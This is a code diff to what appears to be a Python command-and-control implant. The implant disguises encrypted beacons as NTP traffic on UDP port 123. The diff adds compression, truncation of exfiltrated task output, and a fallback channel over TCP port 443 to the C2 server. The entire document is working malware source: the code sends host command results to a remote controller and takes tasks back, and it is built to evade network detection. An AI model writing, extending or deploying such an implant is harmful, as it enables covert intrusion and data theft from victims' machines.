@@ -93,7 +93,7 @@ Limitations:
 """
 
 import base64, hashlib, hmac as _hmac, json, os, platform
-import random, socket, struct, subprocess, sys, time
+import random, socket, struct, subprocess, sys, time, zlib
 
 C2_PSK     = os.environ.get("C2_PSK",     "changeme")
 BEACON_INT = int(os.environ.get("C2_INT",    "60"))
@@ -241,13 +241,13 @@ _KEY = hashlib.pbkdf2_hmac('sha256', C2_PSK.encode(), b'cipherfall_c2_v1', 100_0
 
 def _encrypt(obj):
     nonce   = os.urandom(12)
-    ct, tag = _gcm_enc(_KEY, nonce, json.dumps(obj).encode())
+    ct, tag = _gcm_enc(_KEY, nonce, zlib.compress(json.dumps(obj).encode(), 9))
     return nonce + ct + tag
 
 
 def _decrypt(blob):
     nonce, ct, tag = blob[:12], blob[12:-16], blob[-16:]
-    return json.loads(_gcm_dec(_KEY, nonce, ct, tag))
+    return json.loads(zlib.decompress(_gcm_dec(_KEY, nonce, ct, tag)))
 
 
 def _ntp_ts(t=None):
@@ -357,25 +357,51 @@ AGENT_ID       = _agent_id()
 _pending_result = None
 
 
+def _recvexact(sock, n):
+    buf = b''
+    while len(buf) < n:
+        chunk = sock.recv(n - len(buf))
+        if not chunk:
+            raise EOFError("connection closed")
+        buf += chunk
+    return buf
+
+
 def _beacon(c2_ip):
     global _pending_result
 
-    msg = {"id": AGENT_ID, "ts": int(time.time()), "sysinfo": _sysinfo()}
     if _pending_result:
-        msg["result"] = {"task_id": _pending_result[0], "output": _pending_result[1]}
+        msg = {"id": AGENT_ID, "ts": int(time.time()),
+               "r": {"t": _pending_result[0], "o": _pending_result[1][:120]}}
+    else:
+        msg = {"id": AGENT_ID, "ts": int(time.time()), "sysinfo": {}}
 
     blob = _encrypt(msg)
     pkt  = _build_ntp(blob)
 
+    data = None
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.settimeout(10)
     try:
         sock.sendto(pkt, (c2_ip, 123))
         data, _ = sock.recvfrom(2048)
     except Exception:
-        return
+        pass
     finally:
         sock.close()
+
+    if data is None:
+        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        tcp.settimeout(10)
+        try:
+            tcp.connect((c2_ip, 443))
+            tcp.sendall(struct.pack("!H", len(pkt)) + pkt)
+            rlen = struct.unpack("!H", _recvexact(tcp, 2))[0]
+            data = _recvexact(tcp, rlen)
+        except Exception:
+            return
+        finally:
+            tcp.close()
 
     resp = _parse_ntp(data)
     if not resp:
